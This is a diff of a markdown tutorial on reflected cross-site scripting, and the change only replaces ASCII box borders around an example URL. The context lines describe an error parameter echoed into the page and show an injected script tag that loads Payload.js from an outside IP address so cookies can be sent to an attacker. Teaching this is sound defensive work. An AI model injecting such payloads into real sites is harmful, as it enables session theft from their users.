@@ -25,9 +25,9 @@ Reflected XSS happens when User-Supplied Data in an HTTP Request is included in 
 - <b style={{ color: 'Orange' }}>SCENARIO:</b> In this Website if you Enter Incorrect Input, an Error Message is Displayed. The content of the Error Message gets taken from the error parameter in the query string and is built directly into the page source.
 
 ```html
-+-----------------------------------------+
+┌─────────────────────────────────────────┐
 | http://website.com/?error=Invalid Input |
-+-----------------------------------------+
+└─────────────────────────────────────────┘
 
 <div class="alert alert-danger">
 	<p>Invalid Input</p>
@@ -44,9 +44,9 @@ Reflected XSS happens when User-Supplied Data in an HTTP Request is included in 
 	- The Data the Attacker's Script gathered is sent to them. **[Example: `COOKIES`]**
 
 ```html
-+-----------------------------------------+
+┌─────────────────────────────────────────┐
 | http://website.com/?error=Invalid Input |
-+-----------------------------------------+
+└─────────────────────────────────────────┘
 
 <div class="alert alert-danger">
 	<p><script src="https://10.25.30.50/Payload.js"></script></p>
